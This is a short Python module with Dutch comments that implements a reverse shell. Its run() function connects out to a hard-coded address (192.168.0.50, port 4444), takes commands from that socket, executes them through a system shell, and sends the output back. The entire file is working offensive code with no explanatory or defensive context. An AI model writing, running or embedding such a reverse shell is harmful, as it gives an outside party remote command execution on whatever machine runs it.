import socket
import subprocess
import os

def run():
    target_ip = "192.168.0.50"
    target_port = "4444"

    if not target_ip or not target_port:
        return "Geen IP of poort opgegeven in de config."

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, int(target_port)))
        
        sock.send(b"Reverse shell verbonden.\n")

        while True:
            command = sock.recv(1024).decode("utf-8")
            if command.lower() in ["exit", "quit"]:  # Sluit de verbinding
                break
            if command.strip():
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output
                sock.send(output or b"Geen uitvoer.\n")
            else:
                sock.send(b"Geen commando ontvangen.\n")
    except Exception as e:
        return f"Fout bij openen van reverse shell: {e}"
    finally:
        sock.close()
        return "Reverse shell afgesloten."
